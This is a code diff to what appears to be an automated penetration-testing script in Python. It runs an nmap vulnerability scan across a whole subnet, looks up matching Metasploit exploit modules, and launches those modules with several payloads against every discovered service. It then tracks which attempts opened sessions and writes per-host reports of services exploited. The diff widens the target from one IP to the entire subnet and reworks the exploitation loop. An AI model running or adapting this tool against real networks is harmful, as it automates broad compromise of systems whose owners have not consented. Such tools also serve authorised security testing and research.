@@ -65,7 +65,7 @@ f.write('\nInitiating quick scan from host {0} to {1} \n'.format(subnet[0], subn
 
 # NMAP subnet excluding our IP #
 ## make -Pn, -F, and speed (-T#) switch for during the run
-nm.scan(hosts="10.0.0.10", arguments='-O -sV -T4 -Pn --script vulners --exclude ' + IP)
+nm.scan(hosts=str(subnet), arguments='-O -sV -T4 -Pn --script vulners --exclude ' + IP)
 
 hostsCount = len(nm.all_hosts())
 hostObjects = []
@@ -89,7 +89,6 @@ def findModules(service, details, port, host):
     outFile = service + str(port) + '.csv'
     console.write(fullPathCMD) # make sure we go to right directory first
     while console.is_busy() == True:
-        print(console.read())
         time.sleep(1)
 	# what we want to search msfconsole for now that in right directory
     search = 'search ' + service + ' -S ' + details + ' type:exploit && rank:excellent || rank:good -o ' + outFile
@@ -118,8 +117,8 @@ def findModules(service, details, port, host):
 
 
 def exploitHost(host):
-	successfulModules = 0
-	countMSMod = 0
+	numServWithMods = 0
+	numServExploited = 0
 	exploitObjects = []
 	try:
 		hostDir = host.replace(".","-")
@@ -127,6 +126,7 @@ def exploitHost(host):
 	except Exception as e:
 		print(e)
 	for port in nm[host]['tcp'].keys():
+		serviceExploited = False
 		dfLen = 0
 		service = str(nm[host]['tcp'][port]['name'])
 		details = str(nm[host]['tcp'][port]['product']) + " " + str(nm[host]['tcp'][port]['version'])
@@ -149,46 +149,45 @@ def exploitHost(host):
 					dfLen = 0
 					print("  No modules found")
 
-			else:
-				serviceExploited = False
+			if dfLen > 0:
+				numServWithMods += 1
+
 				for index, row in df.iterrows():
-					if serviceExploited == False:
-						countMSMod += 1
+					if len(client.sessions.list) < 1:
 						result = "Fail"
 						keepRunning = True
 						global lport
 						lport += 1 # increment lport so that modules arent trying to use the same lport
 						exploitName = row['Name'][8:]
 						print("  Attempting module: " + exploitName)
-						exploit2 = client.modules.use('exploit', exploitName)
-						if len(exploit2.targetpayloads()[0]) >= 1:
+						exploitObj = client.modules.use('exploit', exploitName)
+						if len(exploitObj.payloads) >= 1:
 							try: # set remote host
-								exploit2['RHOSTS'] = host
+								exploitObj['RHOSTS'] = host
 							except:
 								try:
-									exploit2['RHOST'] = host
+									exploitObj['RHOST'] = host
 								except:
 									pass
 							try: # set port number
-								exploit2['RPORT'] = port
+								exploitObj['RPORT'] = port
 							except:
 								try:
-									exploit2['RPORTS'] = port
+									exploitObj['RPORTS'] = port
 								except:
 									pass
 
-							if len(exploit2.missing_required) > 0:
-								for item in exploit2.missing_required:
+							if len(exploitObj.missing_required) > 0:
+								for item in exploitObj.missing_required:
 									print("    Item not set: " + item)
 								print("    Exiting exploit: " + exploitName)
 								keepRunning = False
 
 							i = 0
-							goodPayloads = 0
-							while (i <= len(exploit2.targetpayloads())-1 and i < 10) and keepRunning == True:
+							while (i < len(exploitObj.payloads) and i < 5) and keepRunning == True and len(client.sessions.list) < 1:
 								try:
-									payload = exploit2.targetpayloads()[i]
-									payloadObj = client.modules.use('payload', payload)
+									payloadName = exploitObj.payloads[i]
+									payloadObj = client.modules.use('payload', payloadName)
 									try: # set remote host
 										payloadObj['RHOSTS'] = host
 									except:
@@ -218,16 +217,16 @@ def exploitHost(host):
 										except:
 											pass
 
-									print("    Trying payload: " + payload)
+									print("    Trying payload: " + payloadName)
 									if len(payloadObj.missing_required) > 0:
 										for item in payloadObj.missing_required:
 											print("      Item not set: " + item)
-										print("      Exiting payload: " + payload)
+										print("      Exiting payload: " + payloadName)
 										i += 1
 									else:
 										try:
-											exploit2.execute(payload=payloadObj)
-											hostExploits = {"IP":host, 'Service':service, 'Port':str(port), 'Exploit':exploitName, 'Payload':str(payload), 'Result':result}
+											exploitObj.execute(payload=payloadObj)
+											hostExploits = {"IP":host, 'Service':service, 'Port':str(port), 'Exploit':exploitName, 'Payload':str(payloadName), 'Result':result}
 											exploitObjects.append(hostExploits)
 											i += 1
 										except:
@@ -235,75 +234,49 @@ def exploitHost(host):
 											i += 1
 
 
-									#failedToRun = False
-								except:
+										#failedToRun = False
+								except Exception as e:
+									print(e)
 									i += 1
-							# check that all modules (jobs) are complete
-							sleepCount = 0
-							if len(client.jobs.list) > 0:
-								while len(client.jobs.list) > 0 and sleepCount < 10 and serviceExploited == False:
-									if len(client.sessions.list) > 0:
-										successfulModules += 1
-										for index in client.sessions.list:
-											for item in exploitObjects:
-												if item["Exploit"] in str(client.sessions.list[index]['via_exploit']) and item["Payload"] == str(client.sessions.list[index]['via_payload'][8:]):
-													item['Result'] = 'Success'
-											client.sessions.session(index).stop()
-
-										print("      Session created. Module was successful. Moving to next service.")
-										result = 'Success'
-										serviceExploited = True
-									else:
-										time.sleep(1)
-										sleepCount += 1
-							else:
-								if len(client.sessions.list) > 0:
-									successfulModules += 1
-									for index in client.sessions.list:
-										for item in exploitObjects:
-											if item["Exploit"] in str(client.sessions.list[index]['via_exploit']) and item["Payload"] == str(client.sessions.list[index]['via_payload'][8:]):
-												item['Result'] = 'Success'
-										client.sessions.session(index).stop()
-									print("      Session created. Module was successful. Moving to next service.")
-									result = 'Success'
-									serviceExploited = True
-
-							# if len(client.sessions.list) > 0:
-							# 	print("      Session created. Payload was successful.")
-							# 	result = 'Success'
-							# 	# keepRunning = False
-							# 	serviceExploited = True
-							# else:
-							# 	print("      No session created. Payload failed.")
-							if serviceExploited == False:
-								print("    No session created. Module failed.")
-							for job in client.jobs.list:
-								client.jobs.stop(job)
-
-							# hostExploits = {"IP":host, 'Service':service, 'Port':str(port), 'Exploit':exploitName, 'Payload':str(payload), 'Result':result}
-							# exploitObjects.append(hostExploits)
 						else:
 							print("  No payloads available for: " + exploitName)
 
-						# hostExploits = {"IP":host, 'Service':service, 'Port':str(port), 'Exploit':exploitName, 'Payload':str(payload), 'Result':result}
-						# exploitObjects.append(hostExploits)
-			# else:
-			# 	print("  No modules found") # No modules found for this service / port
+				# check that all modules (jobs) are complete
+				sleepCount = 0
+				if len(client.jobs.list) > 0: # still have jobs running so wait a max of 30 secondds if not exploited before
+					while len(client.jobs.list) > 0 and sleepCount < 30 and serviceExploited == False:
+						if len(client.sessions.list) > 0:
+							for job in client.jobs.list:
+								client.jobs.stop(job)
+							numServExploited += 1
+							serviceExploited = True
+							for index in client.sessions.list:
+								for item in exploitObjects:
+									if item["Exploit"] in str(client.sessions.list[index]['via_exploit']) and item["Payload"] == str(client.sessions.list[index]['via_payload'][8:]) and item["Port"] == str(client.sessions.list[index]['session_port']):
+										item['Result'] = 'Success'
+								client.sessions.session(index).stop()
+						else:
+							time.sleep(1)
+							sleepCount += 1
+				else:
+					time.sleep(2)
+					if len(client.sessions.list) > 0:
+						for job in client.jobs.list:
+							client.jobs.stop(job)
+						numServExploited += 1
+						serviceExploited = True
+						for index in client.sessions.list:
+							for item in exploitObjects:
+								if item["Exploit"] in str(client.sessions.list[index]['via_exploit']) and item["Payload"] == str(client.sessions.list[index]['via_payload'][8:]) and item["Port"] == str(client.sessions.list[index]['session_port']):
+									item['Result'] = 'Success'
+							client.sessions.session(index).stop()
 
-	# # check that all modules (jobs) are complete
-	# sleepCount = 0
-	# while len(client.jobs.list) > 0 and sleepCount < 30:
-	# 	print("There are: " + str(len(client.jobs.list)) + " jobs remaining.")
-	# 	time.sleep(1)
-	# 	sleepCount += 1
-	#
-	# for job in client.jobs.list:
-	# 	client.jobs.stop(job)
-	#
-	# for index in client.sessions.list:
-	# 	for item in exploitObjects:
-	# 		if item["Exploit"] in str(client.sessions.list[index]['via_exploit']) and item["Payload"] == str(client.sessions.list[index]['via_payload'][8:]):
-	# 			item['Result'] = 'Success'
+		if serviceExploited == False:
+			print("  Service on port " + str(port) + " not exploited.")
+			for job in client.jobs.list:
+				client.jobs.stop(job)
+		else:
+			print("  Service on port " + str(port) + " was exploited!")
 
 	try:
 		outDir = host.replace(".","-")
@@ -315,10 +288,10 @@ def exploitHost(host):
 				writer.writerow(x)
 
 	except Exception as e:
-		print(e)
+		print("Error from HERE " + str(e))
 
-	print(str(successfulModules) + " successful module(s) found for host: " + host)
-	return countMSMod, successfulModules
+	print(str(numServExploited) + "/" + str(numServWithMods) + " tested services were exploited on host: " + host)
+	return numServWithMods, numServExploited
 
 
 for host in nm.all_hosts():
@@ -332,6 +305,7 @@ for host in nm.all_hosts():
 	countLow = 0 # total number of CVEs that fall in that severity level
 	countNone = 0 # total number of CVEs that fall in that severity level
 	countNoCVEports = 0 # used to determine when to print "No CVEs for this host." (ie when no servies found or no CVEs found)
+	services = 0 # number of services running on the host (same service on 2 different ports counts as 2 services here)
 
 	try:
 		OS = nm[host]['osmatch'][0]['name']
@@ -342,6 +316,7 @@ for host in nm.all_hosts():
 	try:
 		f3.write("\nPort    Service                  Details")
 		for port in nm[host]['tcp'].keys():
+			services += 1
 			serviceFull = str(port).ljust(8," ") + nm[host]['tcp'][port]['name'].ljust(25, " ") + nm[host]['tcp'][port]['product'] + " " + nm[host]['tcp'][port]['version']
 			try:
 				nm[host]['tcp'][port]['script']['vulners']
@@ -410,7 +385,7 @@ for host in nm.all_hosts():
 		severity = 'Critical'
 		severityNum = 4
 
-	thisHost = {"IP":host, "Severity":severity, "SeverityNum":severityNum, "Criticals":countCritical, "Highs":countHigh, "Mediums":countMedium, "Lows":countLow, "Nones":countNone, "CVECount":cveCount, "MSTested":0, "MSSessions":0, "OS":OS}
+	thisHost = {"IP":host, "Severity":severity, "SeverityNum":severityNum, "Criticals":countCritical, "Highs":countHigh, "Mediums":countMedium, "Lows":countLow, "Nones":countNone, "CVECount":cveCount, "ServiceCount":services, "ServicesWithMods":0, "ServicesExploited":0 ,"OS":OS}
 	hostObjects.append(thisHost)
 f3.close()
 
@@ -434,51 +409,51 @@ console = client.consoles.console(cid)
 
 
 for sys in hostObjects:
-	msTested, msSessions = exploitHost(sys["IP"])
-	sys["MSTested"] = msTested
-	sys["MSSessions"] = msSessions
+	countWithMods, countExploited = exploitHost(sys["IP"])
+	sys["ServicesWithMods"] = countWithMods
+	sys["ServicesExploited"] = countExploited
 	if sys["SeverityNum"] == 4:
 		if printed4 == False:
 			printed4 = True
 			f.write("\n--- Vulnerability Level: Critical ---\n")
-			f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tMetasploit Modules Tested: {10}\n\t\tSuccessful Modules: {11}\n".format(sys["IP"],sys["Severity"],sys["SeverityNum"],sys["Criticals"],sys["Highs"],sys["Mediums"],sys["Lows"],sys["Nones"],sys["CVECount"], sys["OS"], sys["MSTested"], sys["MSSessions"]))
+			f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tServices Found: {10}\n\t\tServices with MS Modules: {11}\n\t\tServices Exploited: {12}\n".format(sys["IP"],sys["Severity"],sys["SeverityNum"],sys["Criticals"],sys["Highs"],sys["Mediums"],sys["Lows"],sys["Nones"],sys["CVECount"], sys["OS"], sys["ServiceCount"], sys["ServicesWithMods"], sys["ServicesExploited"]))
 		else:
-			f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tMetasploit Modules Tested: {10}\n\t\tSuccessful Modules: {11}\n".format(sys["IP"],sys["Severity"],sys["SeverityNum"],sys["Criticals"],sys["Highs"],sys["Mediums"],sys["Lows"],sys["Nones"],sys["CVECount"], sys["OS"], msTested, msSessions))
+			f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tServices Found: {10}\n\t\tServices with MS Modules: {11}\n\t\tServices Exploited: {12}\n".format(sys["IP"],sys["Severity"],sys["SeverityNum"],sys["Criticals"],sys["Highs"],sys["Mediums"],sys["Lows"],sys["Nones"],sys["CVECount"], sys["OS"], sys["ServiceCount"], sys["ServicesWithMods"], sys["ServicesExploited"]))
 	elif sys["SeverityNum"] == 3:
 		if printed3 == False:
 			printed3 = True
 			f.write("\n--- Vulnerability Level: High ---\n")
-			f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tMetasploit Modules Tested: {10}\n\t\tSuccessful Modules: {11}\n".format(sys["IP"],sys["Severity"],sys["SeverityNum"],sys["Criticals"],sys["Highs"],sys["Mediums"],sys["Lows"],sys["Nones"],sys["CVECount"], sys["OS"], msTested, msSessions))
+			f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tServices Found: {10}\n\t\tServices with MS Modules: {11}\n\t\tServices Exploited: {12}\n".format(sys["IP"],sys["Severity"],sys["SeverityNum"],sys["Criticals"],sys["Highs"],sys["Mediums"],sys["Lows"],sys["Nones"],sys["CVECount"], sys["OS"], sys["ServiceCount"], sys["ServicesWithMods"], sys["ServicesExploited"]))
 		else:
-			f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tMetasploit Modules Tested: {10}\n\t\tSuccessful Modules: {11}\n".format(sys["IP"],sys["Severity"],sys["SeverityNum"],sys["Criticals"],sys["Highs"],sys["Mediums"],sys["Lows"],sys["Nones"],sys["CVECount"], sys["OS"], msTested, msSessions))
+			f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tServices Found: {10}\n\t\tServices with MS Modules: {11}\n\t\tServices Exploited: {12}\n".format(sys["IP"],sys["Severity"],sys["SeverityNum"],sys["Criticals"],sys["Highs"],sys["Mediums"],sys["Lows"],sys["Nones"],sys["CVECount"], sys["OS"], sys["ServiceCount"], sys["ServicesWithMods"], sys["ServicesExploited"]))
 	elif sys["SeverityNum"] == 2:
 		if printed2 == False:
 			printed2 = True
 			f.write("\n--- Vulnerability Level: Medium ---\n")
-			f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tMetasploit Modules Tested: {10}\n\t\tSuccessful Modules: {11}\n".format(sys["IP"],sys["Severity"],sys["SeverityNum"],sys["Criticals"],sys["Highs"],sys["Mediums"],sys["Lows"],sys["Nones"],sys["CVECount"], sys["OS"], msTested, msSessions))
+			f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tServices Found: {10}\n\t\tServices with MS Modules: {11}\n\t\tServices Exploited: {12}\n".format(sys["IP"],sys["Severity"],sys["SeverityNum"],sys["Criticals"],sys["Highs"],sys["Mediums"],sys["Lows"],sys["Nones"],sys["CVECount"], sys["OS"], sys["ServiceCount"], sys["ServicesWithMods"], sys["ServicesExploited"]))
 		else:
-			f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tMetasploit Modules Tested: {10}\n\t\tSuccessful Modules: {11}\n".format(sys["IP"],sys["Severity"],sys["SeverityNum"],sys["Criticals"],sys["Highs"],sys["Mediums"],sys["Lows"],sys["Nones"],sys["CVECount"], sys["OS"], msTested, msSessions))
+			f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tServices Found: {10}\n\t\tServices with MS Modules: {11}\n\t\tServices Exploited: {12}\n".format(sys["IP"],sys["Severity"],sys["SeverityNum"],sys["Criticals"],sys["Highs"],sys["Mediums"],sys["Lows"],sys["Nones"],sys["CVECount"], sys["OS"], sys["ServiceCount"], sys["ServicesWithMods"], sys["ServicesExploited"]))
 	elif sys["SeverityNum"] == 1:
 		if printed1 == False:
 			printed1 = True
 			f.write("\n--- Vulnerability Level: Low ---\n")
-			f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tMetasploit Modules Tested: {10}\n\t\tSuccessful Modules: {11}\n".format(sys["IP"],sys["Severity"],sys["SeverityNum"],sys["Criticals"],sys["Highs"],sys["Mediums"],sys["Lows"],sys["Nones"],sys["CVECount"], sys["OS"], msTested, msSessions))
+			f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tServices Found: {10}\n\t\tServices with MS Modules: {11}\n\t\tServices Exploited: {12}\n".format(sys["IP"],sys["Severity"],sys["SeverityNum"],sys["Criticals"],sys["Highs"],sys["Mediums"],sys["Lows"],sys["Nones"],sys["CVECount"], sys["OS"], sys["ServiceCount"], sys["ServicesWithMods"], sys["ServicesExploited"]))
 		else:
-			f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tMetasploit Modules Tested: {10}\n\t\tSuccessful Modules: {11}\n".format(sys["IP"],sys["Severity"],sys["SeverityNum"],sys["Criticals"],sys["Highs"],sys["Mediums"],sys["Lows"],sys["Nones"],sys["CVECount"], sys["OS"], msTested, msSessions))
+			f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tServices Found: {10}\n\t\tServices with MS Modules: {11}\n\t\tServices Exploited: {12}\n".format(sys["IP"],sys["Severity"],sys["SeverityNum"],sys["Criticals"],sys["Highs"],sys["Mediums"],sys["Lows"],sys["Nones"],sys["CVECount"], sys["OS"], sys["ServiceCount"], sys["ServicesWithMods"], sys["ServicesExploited"]))
 	elif sys["SeverityNum"] == 0:
 		if printed0 == False:
 			printed0 = True
 			f.write("\n--- Vulnerability Level: None ---\n")
-			f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tMetasploit Modules Tested: {10}\n\t\tSuccessful Modules: {11}\n".format(sys["IP"],sys["Severity"],sys["SeverityNum"],sys["Criticals"],sys["Highs"],sys["Mediums"],sys["Lows"],sys["Nones"],sys["CVECount"], sys["OS"], msTested, msSessions))
+			f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tServices Found: {10}\n\t\tServices with MS Modules: {11}\n\t\tServices Exploited: {12}\n".format(sys["IP"],sys["Severity"],sys["SeverityNum"],sys["Criticals"],sys["Highs"],sys["Mediums"],sys["Lows"],sys["Nones"],sys["CVECount"], sys["OS"], sys["ServiceCount"], sys["ServicesWithMods"], sys["ServicesExploited"]))
 		else:
-			f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tMetasploit Modules Tested: {10}\n\t\tSuccessful Modules: {11}\n".format(sys["IP"],sys["Severity"],sys["SeverityNum"],sys["Criticals"],sys["Highs"],sys["Mediums"],sys["Lows"],sys["Nones"],sys["CVECount"], sys["OS"], msTested, msSessions))
+			f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tServices Found: {10}\n\t\tServices with MS Modules: {11}\n\t\tServices Exploited: {12}\n".format(sys["IP"],sys["Severity"],sys["SeverityNum"],sys["Criticals"],sys["Highs"],sys["Mediums"],sys["Lows"],sys["Nones"],sys["CVECount"], sys["OS"], sys["ServiceCount"], sys["ServicesWithMods"], sys["ServicesExploited"]))
 	elif sys["SeverityNum"] == -1:
 		if printedNeg  == False:
 			printedNeg = True
 			f.write("\n--- Vulnerability Level: Inconclusive ---\n")
-			f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tMetasploit Modules Tested: {10}\n\t\tSuccessful Modules: {11}\n".format(sys["IP"],sys["Severity"],sys["SeverityNum"],sys["Criticals"],sys["Highs"],sys["Mediums"],sys["Lows"],sys["Nones"],sys["CVECount"], sys["OS"], msTested, msSessions))
+			f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tServices Found: {10}\n\t\tServices with MS Modules: {11}\n\t\tServices Exploited: {12}\n".format(sys["IP"],sys["Severity"],sys["SeverityNum"],sys["Criticals"],sys["Highs"],sys["Mediums"],sys["Lows"],sys["Nones"],sys["CVECount"], sys["OS"], sys["ServiceCount"], sys["ServicesWithMods"], sys["ServicesExploited"]))
 		else:
-			f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tMetasploit Modules Tested: {10}\n\t\tSuccessful Modules: {11}\n".format(sys["IP"],sys["Severity"],sys["SeverityNum"],sys["Criticals"],sys["Highs"],sys["Mediums"],sys["Lows"],sys["Nones"],sys["CVECount"], sys["OS"], msTested, msSessions))
+			f.write("\tIP: {0} - {9}\n\t\tSeverity: {1} ({2})\n\t\tCritical CVEs: {3}\n\t\tHigh CVEs: {4}\n\t\tMedium CVEs: {5}\n\t\tLow CVEs: {6}\n\t\tNone CVEs: {7}\n\t\tTotal CVEs: {8}\n\t\tServices Found: {10}\n\t\tServices with MS Modules: {11}\n\t\tServices Exploited: {12}\n".format(sys["IP"],sys["Severity"],sys["SeverityNum"],sys["Criticals"],sys["Highs"],sys["Mediums"],sys["Lows"],sys["Nones"],sys["CVECount"], sys["OS"], sys["ServiceCount"], sys["ServicesWithMods"], sys["ServicesExploited"]))
 
 
 endTime = datetime.now()
